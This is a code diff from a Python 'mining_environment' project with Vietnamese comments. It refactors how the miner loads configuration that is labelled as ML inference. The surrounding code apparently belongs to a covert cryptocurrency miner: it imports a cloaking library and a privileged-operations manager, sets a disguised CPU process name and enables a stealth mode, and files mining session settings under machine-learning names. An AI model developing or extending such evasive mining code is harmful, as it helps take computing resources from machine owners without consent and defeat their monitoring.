@@ -28,7 +28,7 @@ from mining_environment.cpu_plugins.cloaking_lib.utils import (
 from mining_environment.scripts.logging_config import setup_logging
 from mining_environment.scripts import setup_env, system_manager
 from mining_environment.scripts.privileged_operations import get_privileged_manager
-from mining_environment.config.ml_inference_config import get_ml_inference_config
+from mining_environment.cpu_plugins import get_inference_config
 
 # Thiết lập **log directory path** (đường dẫn thư mục logs - tệp ghi nhật ký)
 LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
@@ -66,14 +66,11 @@ def initialize_environment():
     logger.info("Bắt đầu thiết lập môi trường khai thác.")
     try:
         # **Load** (tải) **ML inference configuration** (cấu hình suy luận máy học)
-        ml_config = get_ml_inference_config(logger)
+        ml_config = get_inference_config(logger=logger)
         if not ml_config.validate_configuration():
             logger.error("❌ ML inference configuration validation failed")
             sys.exit(1)
-        
-        # Áp dụng **CPU optimizations** (tối ưu hóa CPU) từ **config** (cấu hình)
-        ml_config.apply_cpu_optimizations()
-        
+
         # **Setup** (thiết lập) **environment variables** (biến môi trường) từ **config** (cấu hình)
         env_vars = ml_config.get_environment_variables()
         for key, value in env_vars.items():
@@ -220,11 +217,11 @@ def initialize_optimized_mining(privileged_mgr):
     try:
         logger.info("Initializing OptimizedCalculationChain...")
         
-        # Lấy **configuration** (cấu hình) từ **MLInferenceConfig** (cấu hình suy luận máy học)
-        ml_config = get_ml_inference_config(logger)
-        cores = ml_config.get_max_cpu_threads()
+        # Lấy configuration từ InferenceConfigService (cấu hình suy luận máy học)
+        inf_cfg = get_inference_config(logger=logger)
+        cores = inf_cfg.get_max_cpu_threads()
         
-        logger.info(f"🚀 Initializing với {cores} cores cho {ml_config.get_cpu_process_name()}")
+        logger.info(f"🚀 Initializing với {cores} cores cho {inf_cfg.get_cpu_process_name()}")
         
         # Tạo **integration config** (cấu hình tích hợp) với **stealth mode** (chế độ ẩn danh)
         config = SystemIntegrationConfig(
@@ -233,7 +230,7 @@ def initialize_optimized_mining(privileged_mgr):
             throttling_compatibility=True,
             monitoring_enabled=True,
             auto_performance_tuning=True,
-            stealth_mode_compatible=ml_config.is_stealth_mode_enabled()
+            stealth_mode_compatible=inf_cfg.is_stealth_mode_enabled()
         )
         
         # Khởi tạo **system integration** (tích hợp hệ thống)
@@ -247,8 +244,8 @@ def initialize_optimized_mining(privileged_mgr):
             # Sử dụng **enhanced mining session config** (cấu hình phiên khai thác cải tiến) từ **MLInferenceConfig**
             from mining_environment.cpu_plugins.optimization.mining_integration_adapter import MiningSessionConfig
             
-            # Lấy **optimized config** (cấu hình được tối ưu hóa) từ **MLInferenceConfig**
-            config_data = ml_config.get_mining_session_config()
+            # Lấy optimized config từ InferenceConfigService
+            config_data = inf_cfg.get_mining_session_config()
             session_config = MiningSessionConfig(
                 profile=config_data["profile"],
                 total_iterations=config_data["total_iterations"],
